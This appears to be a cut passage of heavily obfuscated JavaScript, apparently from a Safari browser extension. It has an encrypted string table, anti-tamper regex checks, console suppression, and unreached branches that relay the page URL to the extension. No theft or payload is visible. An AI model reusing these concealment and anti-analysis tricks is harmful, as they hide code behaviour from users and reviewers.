var a0a = ["wr0bRjtVP8KbeFo=", "LMOPwqMwNg==", "wpfDqMOtw4Rtw6s=", "wrpFw5rDhMOG", "w492V8KNwrc=", "XFtr", "YcOmw41Mw6U=", "wqAWwrHCryXDngUnw5fCrg==", "CCo/biE=", "w77DhiTDsV4=", "wqNew7HCiMOrZXU=", "wpdLw4jCv8Ok", "w60Ow5fDrRA=", "MsOIwqYPPn7DmnzDvMO8", "a8OQw5low45iw4s=", "wrhyw5jCusK1JSdfw5dy", "wr1Jw6XCpMKS", "w70QGMKowrk=", "w44hw4/DkjU=", "Zgd8wrnDgw==", "AMKGHHbCvw==", "wqoNw4xkwoU=", "w4oSFmhE", "AsKoY8Or", "WsOTwo/DpRtBw5w=", "wq3DqwXDpj4Uwrk=", "w4DDisK3wrLCmA==", "XMOoBmo=", "wocWw5TDhh0=",
    "ZTHCo8OKwrs=", "OsKEPEfClA==", "w5hTXsKlwofCjw==", "w5cBAMKSwoE=", "w6cENUAjwr1I", "wpzDssO+w4ht", "JFJPfTA=", "w6kCw4jDtA==", "wpPDj8Obw6pB", "w6AMKlw=", "a8O9woXDjw4=", "wpskaStD", "ZMO0RXIpTcKx", "bcOSJkdceMOpWFg=", "A8OrwoQ=", "w6gsDRPCt8OwR8KBKzo=", "Y8O+SXQ=", "YsOAw4lww4tww43DrWsI", "w7PCvsK4fw8=", "TU3DtWFO", "wrc3wpXDiGc=", "wrDCkwTCr8Ov", "wrQLwovCpws=", "woZRw57DsxI=", "wpvCg2ki", "w5fDisORwrLCtsKvwpjDggtO", "D8O2w5Ebwp3DqcOtw5Q=", "SB9zwpLDkA==", "w5t6dcKtwp8=", "ScKqw5bCn8Kt", "w5kFIcKEwps=",
    "w5cNOQPCpQ==", "WcOXwqYMw4U=", "w5sOw4QrRg==", "w7MCKkkpwrVdcDA=", "DT8tRQ8=", "fVbDsMKtwrvCnU5bNhA=", "cUfDuA==", "HMOWwoEcPA==", "w6Bfw48IOQ==", "O8KCwoTChgrDg8Kg", "wpHChXQ3w48TJMOGwobCpQ==", "wq12w4LDkjg=", "w7BMw5wWRA==", "w5oUwoYoIX07BMOew60=", "wpHDp8Kjw5d7wqAJO3V2", "w5nCrsKZZhg=", "w6QGw5cedA==", "woABw6nDvAE=", "w6rDhxbDnFonUjA=", "w4Q6FyjCjQ==", "YMKXw5bCsMKn", "HikCNMOvwqU=", "e8OSOF1fbsO1W0fCuA==", "enFjw6Yk", "CcOaw4odwoI=", "ZSrCicOzwo0=", "w4wOCWZcTw==", "PsK3GFHCvQ==", "wrLCiDnCocOFw75iw77CpsKH",
    "woxnw7vDicO5", "X8OYwpkQw7A=", "wpbCi2oTw4M=", "w4l9w4gubQ==", "w7/DlcKIwrHCrg==", "wpRaw6vDtRY=", "w7YYw74=", "U8KTw4HDjAE=", "ViFMwrDCm2Zq", "XMK8wqM6w4hSwotkw7Eh", "wovDp8Ojw4Bt", "w6fCmsKOZhM=", "FcOuwp8mAl7Cq1PDgMOQ", "I8KJWcOeCl1PPcKANw==", "wooew6hpwqk=", "wqVhw4PCqcK4", "w6w7L0Fe", "b0LDsH9SZTcESW4=", "TcKAw5PCugBXw5J/wobCnw==", "Q0Rgw54o", "wrHDvDbDric=", "wqYAXg18", "w5BQw6sBUg==", "T8O6W2Ye", "wo9Aw7/DpsOp", "TcOOwp3DoQJT", "w7fCqVfCrsOw", "wqAyw455wpg=", "w4jCs3fCpcOV", "CMKoJXDCvw==",
    "a1rDt19K", "w59ew7HDqBRNNsO1w5nCkg==", "bsKHw7rDggbDgWQKw5HDpA==", "woUIw4d+", "wo4DWSZ/", "woxKw6nDuQ8B", "w6wqwpIsHw==", "WVpqw5g=", "wqU+wqvCmSk=", "wodWw63Dq8OP", "JhwKdA==", "ccOzOE12", "woYDwofDpFQ=", "JRcHTiE=", "wo1dwqTDrwgEK8K4woTCmg==", "T8O9wrfDvhw=", "wqbDgzHDlys=", "UyF4wqjDtMOjwrMgcQ==", "RiNVwq3Cgg==", "wroGWTdILMKTc1M=", "QEZjw4c5OzDCpVVi", "d8KDw5bCtsKR", "wqPDt8KCW8KW", "w6sfI1Y=", "wp5zw7DCusOG", "w4wBw79ODB/CpWdyaA==", "DsK2wpDCtAM=", "Q2nDgVVw", "TsOVwpDDrBFJw4k9", "SsK9w4HCgMKD",
    "w4plw7wLDg==", "c8OlOk1d", "wr9Sw67DhsOi", "HsO2w6M7wpg=", "SxnCl8ORwq8=", "a8OIQW8M", "V0LDgEN1", "wqXDgsKxZsKm", "wrPCo1UEw6s4F8OhwofCmQ==", "w5fCuks=", "woHCiXQz", "wpsoXyly", "JsKOwrjCuSg=", "ej/CqcOcwoPCrg==", "VcOvD3g=", "VMKVw7DCn8Kt", "wphvw5vCs8K2Pj9Kw5Bk", "w68kw4Mdaw==", "OcKrIWnCtxYVd1DDpQ==", "w4gRWcKowoPCm8O6wqvDmcOv", "w4vDhjbDtUY=", "wrEcehJW", "bMOyU3IH", "w7sBGMKRwrE=", "fCfCs8ONw4rDoA==", "SStbwpjCm2poHQ==", "wrA3woTCujs=", "wqB6w6bCo8OT", "wqFMTsO0", "QiNdwos=", "McOGwqAY", "CMO3w4U=",
    "wq0XTTdILsKqZ0Ui", "w60Ow4TDtBHDmMO7Ww==", "BjcISAA=", "w4EwJ8KUwqY=", "TsOIZE0HdcKRZQTDgA==", "wqHDtMOBw4FA", "wrhDw7DCnsKa", "dsOUaXUM", "VMOvWWgoRsO6SibDoA==", "wofDtsKtWMKJ", "ATwAOsOv", "IMK5csOVHQ==", "wqwbwrPDkVo=", "YcKDwoQ=", "wofDhxHDpxo=", "b1LDssKhwrvCng==", "w4YRw6zDkAk=", "AcOWwqAOFw==", "YcKIw4PCtMKawrrCosOnMA==", "TMO0w4JRw74=", "acOOWww=", "w6DCvlXCrcOjBsOp", "w6wPw5TDrA==", "w6BCNR8uwqxBMinDig==", "Sx/CtcOawpg=", "wqMXw6J4wrw=", "wp8Vw5PDmwbDoA==", "wp9SRMK0wpLDg8O7wrzDisOh", "UMO8Hn1y",
    "YsO3wpUaw5w=", "w68Fw7ErVcKVwrLDhw==", "ccOTTQ5KwrxxIWtY", "JsKmKWE=", "R8Omw7lOw6JAw7HDg19S", "wp4Dw5F9wokHbA==", "KwQeAMOM", "w43CnsKeRTxB", "LSs9dBw=", "wqVbw5bDvzc=", "w6fCusKsZQRhIzzCo2s=", "cSLCsMOYwpU=", "w7APw5c=", "Z8Kfw5nCosKbwqXCrg==", "UMK1w4fDoA==", "w7PCq1XCrcO7", "w6nDmBDDkw==", "wrTDhyfDvgU=", "w7nCmMKaaiI=", "QsKOw5jDuCY=", "wp9sRcK1wo/CjcOyw73DjsKz", "w6cPw7A/Rg==", "wrTDlETDgRsyDiJkwpg=", "w4fDlsK7wqPCmQ==", "w4cqPldw", "wqLCrRvCn8Ol", "w6HCr0TCtcOnKsOuw7PDoMKY", "PsKsJHzCtF9Rb1E=",
    "w7nCn1TCsMOp", "w6UDw5PDsQvDkg==", "FCEvNMOL", "S8Omw6Nuw5Y=", "JsKOfMObHA==", "w557RMK2wqk=", "woUVw459wokQbB0=", "wrtcUsO3wpzCoHIHTA4=", "IsKUS8OMHQ==", "wprDq8Oow4k=", "wpnCnXEhw5k=", "TsO4HlduVMOI", "wr52w7nCpsKA", "Z8OawpQyw6E=", "wqpew6k=", "wqxTw7TCuMKg", "SMOqaGgS", "w5Iiw5UuaQ==", "wrtGR8OowpjDqg==", "w7gvLRzCkw==", "w5fDkMK8wo/Cpw==", "Mh4bTznCrMOL", "XcOVwpLDpgNSw5AywprCnw==", "UBxswovDiw==", "w6XCtWbCmcOF", "bDtYwpLDtg==", "w60OwqI8Cw==", "w4AJLWBH", "Ox8zAMOCwoDDiBAPw5A=", "JcOIwrwFIXfCkQ==",
    "wrHDnS/DlhQxwoZoFk0=", "w4ohw7PDkTLDuQ==", "dcK3w7zCusKf", "ZcOBw4Vpwocnw5zDo3gS", "wrPCh2oyw4M=", "wrYWwqvDqVA=", "w5fDgcKXwqPCrMK0wo7Ckg==", "HsKOwrLCkiE=", "VcO+wo3DpBw=", "fjzCqMONwo3CrsOP", "w6I8DRfCt8Ox", "NR4ccg==", "W2PDlA==", "S8OCbUgKbcKH", "TcOIwp8=", "dsOtTh1o", "woXCg2s+w4gOK8OCwrg=", "eVXCtw==", "w4poVMKhwog=", "wqh/w4zDnBE=", "w5YhA8KHwqUXw77DswQ=", "RUZg", "w6YZwqQ=", "w5rCgynClg5kFWFqwr8=", "wpYbw5fDjQ/Cp8KnG8KjGw==", "wrlJw7LCgsK6", "bsOPXBFCwrdqEHo=", "w4UIEMKVwo8=", "w4xcw6kAGQrCkCV9dg==",
    "w51hw6YoGg==", "woTCshLCjMK9wpNcw4LClMK7", "wqbDgcKHbMKr", "ZsONRxpOwr4=", "aEfDosKkwrA=", "wrE1w43Dgyg=", "wrx2w57DvcOW", "VsO0w6R9w5U=", "wqtkw7/Ct8OW", "FcOrw5MQwo0=", "dSHCo8OY", "wpUXw4/DrjE=", "w48EEEBQ", "wo3DtsOg", "wosywqDDpGE=", "w708woIrGg==", "Q8K9w4bDvivDtFg=", "w7ovw5AlYw==", "YsOORgtAwr5g", "aE/DrcKtwqbCjWxeLw==", "wpbDt8KHQ8KH", "w4nDtcK7wrbCsg==", "ZlrDrXNn", "wobCnGsuw5o=", "w5F5w64BZg==", "IhMKZSbCmsOSw4AXw58=", "Y8ONw4l+w59xw4fDqWI=", "wrxHWMOz", "RsKKw6HCgcKg", "UiBkwrXDs8Opwr8=",
    "R11tw4Mv", "CcKXSsOPAg==", "woxpwqonCxjCocO7woUq", "MxciaCs=", "wqF0w5rDhsOk", "w6ZDw40jHQ==", "wo3Dly3DiAYw", "UBNdwp/CgQ==", "woUVw5fDmA==", "w5B7w7spTAvDow==", "w4haw4QJdw==", "wpxSw6jDtw==", "wonDgCbDiQ==", "wrnCqEUEw6w=", "w5QhDnc+", "w5zDqhvDqG8=", "w7J8SMKBwo4=", "ZsKHw6bDmwrDkH4bw47DtA==", "IMK5YcOBHg==", "w7AJw4rDvQvDicOq", "KsOCwrwROnM=", "Gg06F8OJ", "w6YecA==", "XFFiw5AoIQ==", "SXHDgVA=", "woxHw73DtwU=", "wpXCqjDCkMOz", "eWVcw58w", "VDRowq3Dvw==", "YyZ6wrLDqA==", "WcOxAlZ2", "ZcOEThFBwrdVF2FO",
    "w49QXcK+woDCisO5wr/Dt8Ky", "QidAwqTDnQ==", "JcKTwpbCgQ7Dq8KnwpN2Kw==", "SMOCaUw8", "JAkbfw==", "wr1GSMOrwozDqn4a", "NMKIwpPCjA==", "w63DnD7DsEM=", "wqfDqMKbVsKYL8Kmw5vDpsKB", "wrHDvQ/DtjQRwqZIGmQ=", "wpDCp2Mpw58=", "wowWwo7DmlVcYQc=", "cTbCqMOZwpbCqg==", "TMOfwo/DpRhOw5Y0wrrClQ==", "w7LDgcK5woDCiA==", "w5zCn07CkcOI", "wogSw4JpwrI=", "w7cQw4vDsRA=", "w4Y0EG5O", "w6ACKEMgwrBU", "woMUw5RCwrI=", "w6gPw4TDuRDDlcOxRg==", "wpdBw6HDvQ==", "c8O8w7h1w60=", "wphOw4LCi8KF", "wqXCqAzCpsOH", "w6gSwo0lPQ==", "FcOqw5E=",
    "w5Erw6Mtaw==", "N8OnGX13XcOnRmHDsw==", "LcKxLWTCplN4b0fDvQ==", "JcKDRMOAKQ==", "w7QtJ8K0wp4=", "wptjw7TDmMOX", "w7nCj8K6Qz8=", "wpPDsMOHw71l", "wpRcw6kVGB3Cu2lrbw==", "w7bCrcKm", "YMORWC5KwqB2DGFQ", "D8KocsO0", "wrtlw4PCi8KkIyFPw6Fo", "w44nwpc+DA==", "wobCtg3CksOs", "w4LCuXTCs8Or", "w6Z9w5MyNCLClwZURA==", "LMKsLHw=", "wpoMwozDgEdcYgU=", "wptgw4fDqRA=", "SMKkw43Ch8K7", "YMKcw6PDmDI=", "wojDtsOjw4Btw70ObEtq", "wrl6fMOhwo0=", "wpfCrzLCssOW", "IA0rMsOX", "HsOFwpEFPQ==", "w6vDiQHDnkY=", "c8K9w57Cl8KX",
    "w6wtwrYOCg==", "dcO3Zm8g", "M1XDtMKpwqHCkG4cLFM=", "wpYGw5TDgAbCusKyB8KT", "woU4QQ==", "wpszWjls", "w41ww643XwfDtA==", "B8O0woEjA17Cq1vDncOA", "w4DDphbDt2o=", "cUPDs8K7wrTCnmg=", "wrMgwqDCpxI=", "bcKew5HCvg==", "YxZgwozCgg==", "w5PDrcKETMKOYg==", "wqYRQApX", "f8OeQEUT", "ARkSw5A=", "PMOdwrcxKQ==", "w5TCusKCSjw=", "VsOOwojDpQQawop+wpnChw==", "w7AIKFQ=", "dMKfw5vCqMKSwqDCp8Ok", "bsOHw499", "QCJTwr7CrQ==", "WMOzHg==", "ATgNJ8Ouwr4=", "w6oEw7YvWcKzwrs=", "wo9Lw4zCm8Oq", "Mh4bRznCvcOUw5scw4Q=", "wq0EWSZD",
    "wrowwq7Dr2xlXyQpwrQ=", "wo8NwofDjVZH", "XMOfwprDugVFw4k+wo/ClA==", "VMOedFYOZMKaZRrDgA==", "I8KhJ2k=", "wpsIw6JJwq8=", "eWwYw5PCsyo=", "VcOyGWo=", "w5UkEGYV", "aMOaw50=", "w7JPw78VZw==", "w77CvkvCpsO2DQ==", "bsO+H213", "wqsqw4ZfwqU=", "wrtpw4PCr8O/JCdHw7d0", "R8O6wr0iw78=", "w6o8BRnCrcO8eMKdZGA=", "wqEIw6JZwoA=", "RiBkwqLDrsOtwrUo", "wpDDq8O/w4Q=", "w6dRw70TfQ==", "SCvCsMO6wqE=", "wrwcw6nDkD4=", "w7XCt2DClcOX", "wqpdw67CtcOf", "w68IKFc7wrQ=", "EsOPwrdWaW/CnHzDocK4", "AcKywo7CpBE=", "FsO3w54Owo7DpMOkw4vCnsOr",
    "AMKHI1XCmA==", "JzQaF8OY", "w5V+w7wuOA==", "woobw5w=", "acKRw4PCssKc", "wq7DkCnDihEsw4RtNg==", "UcO4wrTDkR4=", "aMOPThc=", "w544w6QaEz7DjsKjw6oN", "w6vDjRvDiQ46Un4DwpA=", "V8OreRdi", "wp8oZwpv", "WMOxwqc/w4ZSw5ckwqU=", "w4LCvE3CmMOg", "c0TDqsKtwrbCjQ==", "U8OyHQ==", "wqByw5LCrA==", "MMKyVMOpBA==", "woUIw4J9wp0AbAo=", "w7ktMsKnwoM=", "TSFZwp0=", "OyEtEcOr", "woNow5fCqsOk", "HSIvIsOv", "w4kDLnEM", "w7g+wo4vCQ==", "wp15w6zCvMOQ", "cDLCssOdwoo=", "wpTCshzCisOgw4I=", "wpBfw5zCqsOz", "aMOLYVAu", "w7Vsw6I0LA==",
    "X8OnwqYCw7A=", "w54Rw57DrxQ=", "wqFDw6rClg==", "Q8Ogwr8=", "JiHCo8OKwpfCsMOEwoLDlcKP", "ccKew6TDoQo=", "RixZwpDCgQ==", "FRUtQzk=", "w7vCscKbQBo=", "wqwgw5DCpsK/NTJKwqNy", "IcOQw6Qhwp0=", "wqBYw63Cn8OrYSI=", "dcO8GnlC", "JcKoA2HCqA==", "HjkINsOo", "eTbCoMOXwozCp8O6w5DDicKL", "wrlow5nCvsKG", "w7bDpRvDnHw=", "wrpSw5/DkMOv", "WsO4HlduVMOI", "wrBNTcOuwpfDq0sbQBI=", "YcO0w5h8w5w=", "fnVYw74KDA==", "w4bDjMKUwqXCtcKVwp/CkksI", "wqXCiUAJw7c=", "w71kw5UTUw==", "wpxcw6rDqBQfLcO5w5nDnQ==", "w4Uzw7TDjSnDucOBbT7DnA==",
    "wpYcw4RWwo8=", "w4pcw74OHw==", "w4YPNcKHwps=", "RcOQfgFp", "fgXCrcO5wq8=", "w5xQX8K0wonCj8Ow", "w7LDhwfDvEIi", "w60CMQ==", "W8OwKXlK", "woRHR8O+wp/Dp3cFfBs=", "w68TMH17", "w5fDgcKFwrPCrMKow4vDiEQT", "w4RHw6MPGw==", "QcOdwokEw6A=", "w5hiw6oEKg==", "wonCqRPCmw==", "acOVXAhcw6gqSmNR", "T8O1wr7DoT0=", "w51bw6IVBALCsA==", "w7Mnw7wrcw==", "T8OJeTJm", "wqdsw5bCvsK1Mw==", "w70tERnCrcO+QcKJcg==", "wpnCnl89w4s=", "bT1EwpjDlQ==", "wqYrUS1D", "wqE1w6hkwpE=", "DMK5HlXChg==", "woddw5XDlxA=", "wrovw7dHwrI=", "C8KoJsOoK2B/F8K/Gw==",
    "V8OVwpI=", "a8OHJkpT", "wrDDlEbDgRwyCiJkwpg=", "w74QBTrCkg==", "KcOlwpoyJw==", "w6zDt8K+worCn8KSwq7Cv3Ip", "woBWw6nCnMOI", "fnVYw74KDBvCj0RZ", "wrnDg8Kcf8K0", "wqxUw7/Ciw==", "C8OKw6URwpw=", "w6tlw6svVg==", "w5x6w7AoUQjDtA==", "wpLDv8KDSsKQNcKjw5jDmw==", "w6cTKTbCmg==", "wql/w7fDvxo=", "dFTDpcKu", "wpTDkcKcaMKz", "ZUTDmsKgwqc=", "woHDpsOWw5h6", "w6UQw5fDtB0=", "cMOobTBF", "R8OoZDRwwoJXKkN3", "wpvDtRPDiTo=", "w7QPw4vDoQLDlcOyRCTCmg==", "wp8WwozDkEdHeAgQwpI=", "csOHw4t4w4o=", "eAnCq8OIwoM=", "wpR+w5LCtsOBSRdXwpwh",
    "w7wBwpE7", "TcO4TE0L", "w7srPsKKwqo=", "dRJzwpvDow==", "wqAcQio=", "wqZNWMO3wpbDoGgMewc=", "wp/DtcKSSQ==", "w7/DlcKiwqzCrA==", "woLDgm8ow4sfKMOWwqzDrg==", "wrwcwqzCug==", "NycKMsOr", "UzvCl8O0wqs=", "YsK1w4DCg8K8", "cMO5wr4jw4Q=", "w5fDpTLDm34=", "PcK3MWnCtw==", "ajZOwrjDjw==", "PsKsO3PCsA==", "wpMDeDRU", "Q2zDgE8=", "w7DCusKmag==", "NMKCw5fClEvDlsKgwp5mJA==", "wofDssKvasKX", "w5taU8Ky", "wr8dw4jDuwo=", "w6LCtEnCuMOkDMOgw7U=", "w74twpAnKQ==", "eUDDq8KPwpc=", "NAkD", "Ym54w4AI", "ATgeOsO1wqrDozk6",
    "worCpBLCkg==", "wp5GQ8OGwro=", "wqs2bTtX", "wqBWw7/CjsOU", "A8K0ZcOhJnRoAQ==", "wpnDtMO8w5xx", "wqUHw4vDhxs=", "wqdVw5bCksKB", "w5QqMcK0wo8=", "w49NXsK3woPCkcOhwqrDqsKu", "w6oeKVwuwqhUeA==", "wr3DrcOcw4Rf", "wr8Rwq3Csw==", "Fz4YKg==", "w6UUw7/Dogg=", "UsO7wqAmw4hIwpxlw4gx", "SXfDkEZ3Gkdmf0k=", "w6k0wroQIA==", "SWfDo8K/woE=", "wrjDgg7Dnjo=", "BiUBNsOowrnDqzIz", "wqjDksK5Z8K/CMKOw7vDsMK8"
];
(function (params, content) {
    var fn = function (selected_image) {
        for (; --selected_image;) {
            params.push(params.shift());
        }
    };
    var build = function () {
        var target = {
            "data": {
                "key": "cookie",
                "value": "timeout"
            },
            "setCookie": function (data, name, uri, headers) {
                headers = headers || {};
                var url = name + "=" + uri;
                var q = 0;
                var i = 0;
                var key = data.length;
                for (; i < key; i++) {
                    var d = data[i];
                    url = url + ("; " + d);
                    var value = data[d];
                    data.push(value);
                    key = data.length;
                    if (value !== true) {
                        url = url + ("=" + value);
                    }
                }
                headers.cookie = url;
            },
            "removeCookie": function () {
                return "dev";
            },
            "getCookie": function (match, href) {
                match = match || function (canCreateDiscussions) {
                    return canCreateDiscussions;
                };
                var v = match(new RegExp("(?:^|; )" + href.replace(/([.$?*|{}()[]\/+^])/g, "$1") + "=([^;]*)"));
                var test = function (callback, i) {
                    callback(++i);
                };
                test(fn, content);
                return v ? decodeURIComponent(v[1]) : undefined;
            }
        };
        var init = function () {
            var test = new RegExp("\\w+ *\\(\\) *{\\w+ *['|\"].+['|\"];? *}");
            return test.test(target.removeCookie.toString());
        };
        target.updateCookie = init;
        var array = "";
        var k = target.updateCookie();
        if (!k) {
            target.setCookie(["*"], "counter", 1);
        } else {
            if (k) {
                array = target.getCookie(null, "counter");
            } else {
                target.removeCookie();
            }
        }
    };
    build();
})(a0a, 367);
var a0b = function (m, gamma) {
    m = m - 0;
    var l = a0a[m];
    if (a0b.yYCZAh === undefined) {
        (function () {
            var unescape = function () {
                var source;
                try {
                    source = Function("return (function() " + '{}.constructor("return this")( )' + ");")();
                } catch (l) {
                    source = window;
                }
                return source;
            };
            var s_utf8 = unescape();
            var listeners = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
            if (!s_utf8.atob) {
                s_utf8.atob = function (i) {
                    var str = String(i).replace(/=+$/, "");
                    var pix_color = "";
                    var bc = 0;
                    var bs;
                    var buffer;
                    var Y = 0;
                    for (; buffer = str.charAt(Y++); ~buffer && (bs = bc % 4 ? bs * 64 + buffer : buffer, bc++ % 4) ? pix_color = pix_color + String.fromCharCode(255 & bs >> (-2 * bc & 6)) : 0) {
                        buffer = listeners.indexOf(buffer);
                    }
                    return pix_color;
                };
            }
        })();
        var testcase = function (data, fn) {
            var result = [];
            var i = 0;
            var word;
            var testResult = "";
            var tempData = "";
            data = atob(data);
            var val = 0;
            var key = data.length;
            for (; val < key; val++) {
                tempData = tempData + ("%" + ("00" + data.charCodeAt(val).toString(16)).slice(-2));
            }
            data = decodeURIComponent(tempData);
            var j;
            j = 0;
            for (; j < 256; j++) {
                result[j] = j;
            }
            j = 0;
            for (; j < 256; j++) {
                i = (i + result[j] + fn.charCodeAt(j % fn.length)) % 256;
                word = result[j];
                result[j] = result[i];
                result[i] = word;
            }
            j = 0;
            i = 0;
            var PL$19 = 0;
            for (; PL$19 < data.length; PL$19++) {
                j = (j + 1) % 256;
                i = (i + result[j]) % 256;
                word = result[j];
                result[j] = result[i];
                result[i] = word;
                testResult = testResult + String.fromCharCode(data.charCodeAt(PL$19) ^ result[(result[j] + result[i]) % 256]);
            }
            return testResult;
        };
        a0b.VqQkxC = testcase;
        a0b.HXMKWI = {};
        a0b.yYCZAh = true;
    }
    var o = a0b.HXMKWI[m];
    if (o === undefined) {
        if (a0b.avdWvu === undefined) {
            var WMCacheControl = function (deny) {
                this.mpnbTz = deny;
                this.TQjLvW = [1, 0, 0];
                this.dNECWX = function () {
                    return "newState";
                };
                this.TAlOar = "\\w+ *\\(\\) *{\\w+ *";
                this.yLVawE = "['|\"].+['|\"];? *}";
            };
            WMCacheControl.prototype.VyqkgG = function () {
                var test = new RegExp(this.TAlOar + this.yLVawE);
                var artistTrack = test.test(this.dNECWX.toString()) ? --this.TQjLvW[1] : --this.TQjLvW[0];
                return this.QKPkcL(artistTrack);
            };
            WMCacheControl.prototype.QKPkcL = function (canCreateDiscussions) {
                if (!Boolean(~canCreateDiscussions)) {
                    return canCreateDiscussions;
                }
                return this.xCJawF(this.mpnbTz);
            };
            WMCacheControl.prototype.xCJawF = function (saveNotifs) {
                var fp = 0;
                var len = this.TQjLvW.length;
                for (; fp < len; fp++) {
                    this.TQjLvW.push(Math.round(Math.random()));
                    len = this.TQjLvW.length;
                }
                return saveNotifs(this.TQjLvW[0]);
            };
            (new WMCacheControl(a0b)).VyqkgG();
            a0b.avdWvu = true;
        }
        l = a0b.VqQkxC(l, gamma);
        a0b.HXMKWI[m] = l;
    } else {
        l = o;
    }
    return l;
};
var f = function () {
    var c = true;
    return function (object__360, function__361) {
        var loopend = c ? function () {
            if (function__361) {
                var cssobj = function__361.apply(object__360, arguments);
                function__361 = null;
                return cssobj;
            }
        } : function () {};
        c = true;
        return loopend;
    };
}();
var fO = f(this, function () {
    var intval = function () {
        return "dev";
    };
    var getDOMPath = function () {
        return "window";
    };
    var testcase = function () {
        var test = new RegExp("\\w+ *\\(\\) *{\\w+ *['|\"].+['|\"];? *}");
        return !test.test(intval.toString());
    };
    var _stringify = function () {
        var test = new RegExp("(\\\\[x|u](\\w){2,4})+");
        return test.test(getDOMPath.toString());
    };
    var wrap = function (p) {
        var ms_controller = ~-1 >> 1 + 255 % 0;
        if (p.indexOf("i" === ms_controller)) {
            create(p);
        }
    };
    var create = function (s) {
        var n = ~-4 >> 1 + 255 % 0;
        if (s.indexOf((!![] + "")[3]) !== n) {
            wrap(s);
        }
    };
    if (!testcase()) {
        if (!_stringify()) {
            wrap("indеxOf");
        } else {
            wrap("indexOf");
        }
    } else {
        wrap("indеxOf");
    }
});
fO();
var e = function () {
    var _ = {};
    _.fxIxA = function (letter, all) {
        return letter == all;
    };
    _.Scusm = function (type, imagePixelModule) {
        return type === imagePixelModule;
    };
    _.dKxLT = "nWFOv";
    var tileFuncs = _;
    var closeExpr = true;
    return function (object__360, function__361) {
        var scanKeyPubBytes = {};
        scanKeyPubBytes.uWefn = function (mmaModFeedbackAutomSyncedEvent, tiles) {
            return tileFuncs.fxIxA(mmaModFeedbackAutomSyncedEvent, tiles);
        };
        scanKeyPubBytes.iJJFY = function (mmaModFeedbackAutomSyncedEvent, tiles) {
            return tileFuncs.Scusm(mmaModFeedbackAutomSyncedEvent, tiles);
        };
        scanKeyPubBytes.ptPTo = tileFuncs.dKxLT;
        var Q = scanKeyPubBytes;
        var closingExpr = closeExpr ? function () {
            var undefined = {};
            undefined.oUaXQ = function (key, itm) {
                return Q.uWefn(key, itm);
            };
            var extensions = undefined;
            if (function__361) {
                if (Q.iJJFY(Q.ptPTo, "XbCss")) {
                    var j = $jscomp.propertyToPolyfillSymbol[c];
                    if (extensions.oUaXQ(null, j)) {
                        return a[c];
                    }
                    j = a[j];
                    return void 0 !== j ? j : a[c];
                } else {
                    var cssobj = function__361.apply(object__360, arguments);
                    function__361 = null;
                    return cssobj;
                }
            }
        } : function () {};
        closeExpr = true;
        return closingExpr;
    };
}();
(function () {
    var target = {};
    target.JEoQx = "function *" + "( *)";
    target.pCGTJ = function (saveNotifs, notifications) {
        return saveNotifs(notifications);
    };
    target.NxPSG = "init";
    target.FNcJD = function (buckets, name) {
        return buckets + name;
    };
    target.WAvwA = "chain";
    target.dtcxZ = "input";
    target.fZvbB = function (saveNotifs, notifications) {
        return saveNotifs(notifications);
    };
    target.NETsm = function (callback, response_2, webhookMsg) {
        return callback(response_2, webhookMsg);
    };
    var a = target;
    a.NETsm(e, this, function () {
        var numericValueTests = new RegExp(a.JEoQx);
        var test = new RegExp("++ *(?:[" + "a-zA-Z_$][" + "0-9a-zA-Z_$]*)", "i");
        var label = a.pCGTJ(d, a.NxPSG);
        if (!numericValueTests.test(a.FNcJD(label, a.WAvwA)) || !test.test(label + a.dtcxZ)) {
            a.fZvbB(label, "0");
        } else {
            d();
        }
    })();
})();
var c = function () {
    var activeIndex = {};
    activeIndex.VLsdz = function (i, categoryStart) {
        return i === categoryStart;
    };
    activeIndex.WeHFV = function (_num2, _num1) {
        return _num2 / _num1;
    };
    activeIndex.lqvfw = function (optionsValue, value) {
        return optionsValue !== value;
    };
    activeIndex.dlhHl = "lrXze";
    var tileFuncs = activeIndex;
    var closeExpr = true;
    return function (object__360, function__361) {
        var values = {};
        values.OYBMz = function (mmaModFeedbackAutomSyncedEvent, tiles) {
            return tileFuncs.VLsdz(mmaModFeedbackAutomSyncedEvent, tiles);
        };
        values.oruSZ = function (mmaModFeedbackAutomSyncedEvent, tiles) {
            return tileFuncs.WeHFV(mmaModFeedbackAutomSyncedEvent, tiles);
        };
        values.PANfz = function (mmaModFeedbackAutomSyncedEvent, tiles) {
            return tileFuncs.lqvfw(mmaModFeedbackAutomSyncedEvent, tiles);
        };
        values.BzVPT = function (saveNotifs) {
            return saveNotifs();
        };
        values.xEkDU = "none";
        var handlers = values;
        if (tileFuncs.dlhHl !== tileFuncs.dlhHl) {
            return handlers.OYBMz(c, b) ? 0 !== c || handlers.OYBMz(handlers.oruSZ(1, c), 1 / b) : handlers.PANfz(c, c) && b !== b;
        } else {
            var closingExpr = closeExpr ? function () {
                if ("cMLBQ" !== "lPRrQ") {
                    if (function__361) {
                        var cssobj = function__361.apply(object__360, arguments);
                        function__361 = null;
                        return cssobj;
                    }
                } else {
                    if (d) {
                        handlers.BzVPT(e);
                    } else {
                        var body = document.body;
                        if (body && handlers.OYBMz(handlers.xEkDU, body.style.display)) {
                            window.location.replace(location.href);
                        }
                    }
                    var query = {};
                    query.url = location.href;
                    query.status = d;
                    safari.extension.dispatchMessage(eventName, query);
                }
            } : function () {};
            closeExpr = true;
            return closingExpr;
        }
    };
}();
var g = c(this, function () {
    var self = {};
    self.rlMnf = "info";
    self.fmCgP = "6|3|2|7|4|" + "0|9|5|8|1";
    self.EiPtW = function (letter, all) {
        return letter == all;
    };
    self.JcDyU = function (saveNotifs, notifications) {
        return saveNotifs(notifications);
    };
    self.uIRnB = function (buckets, name) {
        return buckets + name;
    };
    self.posvb = function (saveNotifs) {
        return saveNotifs();
    };
    self.QHGdH = "lHXSM";
    self.ktKMm = function (optionsValue, value) {
        return optionsValue !== value;
    };
    self.qOBtJ = "FRXum";
    var app = self;
    var e = function () {};
    var result;
    try {
        result = app.posvb(aL);
    } catch (aV) {
        result = window;
    }
    if (!result.console) {
        if ("vAduq" === app.QHGdH) {
            var code = xhr.responseText;
            var data = {
                "status": code,
                "timestamp": Date.now()
            };
            localStorage.setItem(app.rlMnf, JSON.stringify(data));
            if (d) {
                b(code);
            }
        } else {
            result.console = function (e) {
                var callbackVals = app.fmCgP.split("|");
                var callbackCount = 0;
                for (; true;) {
                    switch (callbackVals[callbackCount++]) {
                    case "0":
                        result.error = e;
                        continue;
                    case "1":
                        return result;
                    case "2":
                        result.warn = e;
                        continue;
                    case "3":
                        result.log = e;
                        continue;
                    case "4":
                        result.info = e;
                        continue;
                    case "5":
